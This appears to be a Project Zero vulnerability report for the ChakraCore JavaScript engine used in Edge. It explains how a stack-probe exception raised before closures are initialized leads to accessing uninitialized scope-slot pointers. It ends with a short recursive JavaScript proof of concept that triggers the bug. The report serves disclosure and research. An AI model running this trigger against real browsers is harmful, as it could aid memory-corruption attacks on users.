/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1338

Here's a snippet of the method that interprets a javascript function's bytecode.

Js::Var Js::InterpreterStackFrame::INTERPRETERLOOPNAME()
{
    PROBE_STACK(scriptContext, Js::Constants::MinStackInterpreter); <<----- (a)

    if (!this->closureInitDone)
    {
        Assert(this->m_reader.GetCurrentOffset() == 0);
        this->InitializeClosures();    <<------- (b)
    }

    ...
    ... interprets the bytecode

...

At (b), it initializes the local variables of the javascript function. In the PoC, the variables a, b and c are initialized.
But at (a), if it fails to allocate Js::Constants::MinStackInterpreter bytes to the stack, it throws an exception which leads to the following code.

void StackScriptFunction::BoxState::Box()
{
...

    if (callerFunctionBody->DoStackScopeSlots())
    {
        Var* stackScopeSlots = (Var*)interpreterFrame->GetLocalClosure();
        if (stackScopeSlots)
        {
            Var* boxedScopeSlots = this->BoxScopeSlots(stackScopeSlots, ScopeSlots(stackScopeSlots).GetCount());
            interpreterFrame->SetLocalClosure((Var)boxedScopeSlots);
        }
    ...
...

"stackScopeSlots" contains the local variables that were supposed to be initialized at (b). So it results in accessing the uninitialized pointers.

It's a little difficult to trigger this in Edge. So I recommend to use the command: ./Debug/ch -NoNative ~/test.js.

PoC:
*/

function trigger() {
    let a, b, c;

    function g() {
        trigger();

        a, b, c;
    }

    g();
}

trigger();